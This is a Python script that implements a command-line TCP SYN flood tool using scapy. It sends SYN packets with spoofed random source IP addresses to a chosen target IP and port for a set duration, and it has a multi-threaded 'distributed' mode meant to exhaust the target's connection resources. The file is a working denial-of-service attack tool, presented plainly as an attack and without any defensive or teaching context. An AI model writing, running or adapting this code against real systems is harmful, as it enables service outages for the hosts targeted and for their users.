#!/usr/bin/env python3

"""
TCP-SYN Flood Attack Script
- Floods target with TCP SYN packets without completing the handshake
- Quickly exhausts the target's connection resources
- Compatible with Python 3.10
"""

from scapy.all import *
import argparse
import time
import random
from datetime import datetime

def tcp_syn_flood(target_ip, target_port=80, duration=60, verbose=True):
    """
    Execute a TCP SYN flood attack against the target
    
    :param target_ip: Target IP address
    :param target_port: Target port (default: 80)
    :param duration: Attack duration in seconds (default: 60)
    :param verbose: Whether to print status updates (default: True)
    """
    if verbose:
        print(f"[*] Starting TCP SYN flood attack against {target_ip}:{target_port}")
        print(f"[*] Attack will run for {duration} seconds")
        print(f"[*] Started at: {datetime.now().strftime('%H:%M:%S')}")
    
    start_time = time.time()
    packet_count = 0
    
    try:
        # Continue until duration is reached
        while time.time() - start_time < duration:
            # Create a random source IP (spoofing)
            source_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            source_port = random.randint(1024, 65535)
            
            # Craft the TCP SYN packet
            ip_layer = IP(src=source_ip, dst=target_ip)
            tcp_layer = TCP(sport=source_port, dport=target_port, flags="S", seq=random.randint(1000,9000))
            packet = ip_layer / tcp_layer
            
            # Send the packet
            send(packet, verbose=0)
            packet_count += 1
            
            # Print status updates
            if verbose and packet_count % 100 == 0:
                elapsed = time.time() - start_time
                print(f"[*] Sent {packet_count} packets | Elapsed time: {elapsed:.2f}s")
            
    except KeyboardInterrupt:
        if verbose:
            print("\n[!] Attack interrupted by user")
    
    # Print final statistics
    if verbose:
        total_time = time.time() - start_time
        print(f"\n[*] Attack completed")
        print(f"[*] Total packets sent: {packet_count}")
        print(f"[*] Total time: {total_time:.2f} seconds")
        print(f"[*] Packet rate: {packet_count/total_time:.2f} packets/second")
    
    return packet_count

def distributed_syn_flood(target_ip, target_port=80, num_threads=4, duration=60):
    """
    Execute a distributed TCP SYN flood attack using multiple threads
    
    :param target_ip: Target IP address
    :param target_port: Target port (default: 80)
    :param num_threads: Number of threads to use (default: 4)
    :param duration: Attack duration in seconds (default: 60)
    """
    print(f"[*] Starting distributed TCP SYN flood attack against {target_ip}:{target_port}")
    print(f"[*] Using {num_threads} threads")
    print(f"[*] Attack will run for {duration} seconds")
    print(f"[*] Started at: {datetime.now().strftime('%H:%M:%S')}")
    
    # Create and start threads
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(
            target=tcp_syn_flood,
            args=(target_ip, target_port, duration, False)
        )
        thread.daemon = True
        threads.append(thread)
        thread.start()
        print(f"[*] Started thread {i+1}")
    
    # Wait for all threads to finish
    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            print(f"\r[*] Attack in progress: {elapsed:.2f}s / {duration}s", end="")
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        
    # Wait for threads to finish
    for i, thread in enumerate(threads):
        thread.join(1)  # Wait up to 1 second
        print(f"[*] Thread {i+1} completed")
    
    print("\n[*] Distributed attack completed")

if __name__ == "__main__":
    # Setup argument parser
    parser = argparse.ArgumentParser(description='TCP SYN Flood Attack Tool')
    parser.add_argument('-t', '--target', required=True, help='Target IP address')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('-d', '--duration', type=int, default=30, help='Attack duration in seconds (default: 30)')
    parser.add_argument('-m', '--mode', choices=['single', 'distributed'], default='single', help='Attack mode (single or distributed)')
    parser.add_argument('-n', '--threads', type=int, default=4, help='Number of threads for distributed mode (default: 4)')
    
    args = parser.parse_args()
    
    # Import threading if needed
    if args.mode == 'distributed':
        import threading
    
    # Execute attack
    if args.mode == 'single':
        tcp_syn_flood(args.target, args.port, args.duration)
    else:
        distributed_syn_flood(args.target, args.port, args.threads, args.duration)
